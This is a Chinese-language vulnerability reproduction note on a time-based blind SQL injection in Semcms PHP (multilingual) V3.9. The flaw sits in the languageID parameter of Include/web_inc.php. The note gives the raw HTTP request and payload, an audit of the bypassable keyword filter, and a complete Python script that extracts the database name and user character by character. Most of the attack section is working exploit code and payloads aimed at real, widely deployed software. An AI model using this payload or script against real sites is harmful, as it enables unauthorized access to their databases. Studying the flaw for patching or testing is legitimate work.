Semcms PHP(多语)版 V3.9 sql注入漏洞
===================================

一、漏洞简介
------------

二、漏洞影响
------------

Semcms PHP(多语)版 V3.9

三、复现过程
------------

### 漏洞详情

漏洞文件为Include下的web\_inc.php文件

包

    POST /Include/web_inc.php HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: keep-alive
    Cookie: scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b
    Upgrade-Insecure-Requests: 1
    Content-Length: 64
    Content-Type: application/x-www-form-urlencoded

    languageID=0 or if(substr(database(),1,1) like 0x6D,sleep(5),1);

基于时间的注入

### 代码审计

查看web\_inc.php的关键代码

    if (isset($_POST["languageID"])){$Language=test_input(verify_str($_POST["languageID"]));}else{$Language=verify_str($Language);}

    if(!empty($Language)){

          //网站SEO设定

          $query=$db_conn->query("select * from sc_tagandseo where languageID=$Language");
          $row=mysqli_fetch_array($query);
          $tag_indexmetatit=datato($row['tag_indexmetatit']);// 首页标题
          $tag_indexkey=datato($row['tag_indexkey']);// 首页关键词
          $tag_indexdes=datato($row['tag_indexdes']);// 首页描述 

    ......

可以看到查询语句没有利用单引号闭合

跟入过滤函数查看

    function test_input($data) { 
          $data = str_replace("%", "percent", $data);
          $data = trim($data);
          $data = stripslashes($data);
          $data = htmlspecialchars($data,ENT_QUOTES);
          return $data;

       }
    function inject_check_sql($sql_str) {

         return preg_match('/select|insert|=|%|<|between|update|\'|\*|union|into|load_file|outfile/i',$sql_str);
    } 

    function verify_str($str) { 

       if(inject_check_sql($str)) {

           exit('Sorry,You do this is wrong! (.-.)');
        } 

        return $str; 
    }

过滤了一些关键字，正常的联合注入是没有办法了，可以时间盲注

利用`if`和`sleep`构造payload，因为`<`,`=`被过滤且存在`htmlspecialchars`函数，利用like代替

    languageID=0 or if(substr(database(),1,1) like 0x6e,sleep(5),1);

附上脚本

    # !/usr/bin/python3
    # -*- coding:utf-8 -*-
    # author: Forthrglory

    import requests

    def getDatabase(url):
        s = ''
        r = requests.session()
        head = {'Content-Type':'application/x-www-form-urlencoded'}

        for i in range(1,9):
            for j in range(97,122):
                data = 'languageID=0 or if(substr(database(),%s,1) like %s,sleep(5),1);' % (i,hex(j))

                result = r.post(url, data, headers=head)

                if(result.elapsed.total_seconds() > 5):
                    s = s + chr(j)
                    print(s)
                    break
        print('database=' + s)


    def getUser(url):
        s = ''
        r = requests.session()
        head = {'Content-Type':'application/x-www-form-urlencoded'}

        for i in range(1,21):
            for j in range(64,90):
                data = 'languageID=0 or if(substr(user(),%s,1) like %s,sleep(5),1);' % (i,hex(j))

                result = r.post(url, data, headers=head)

                if(result.elapsed.total_seconds() > 5):
                    s = s + chr(j).lower()
                    print(s)
                    break
        print('user=' + s)

    if __name__ == '__main__':
        url = 'http://127.0.0.1/Include/web_inc.php'

        s = getDatabase(url)
        u = getUser(url)

运行截图

![](./resource/SemcmsPHP(多语)版V3.9sql注入漏洞/media/rId26.png)

![](./resource/SemcmsPHP(多语)版V3.9sql注入漏洞/media/rId27.png)

不过因为过滤了select，暂时不知道怎么注出数据ORZ，比如说注出user表中的密码之类的，如果有师傅愿意不吝赐教，这里万分感谢

参考链接
--------

> <https://xz.aliyun.com/t/7122>
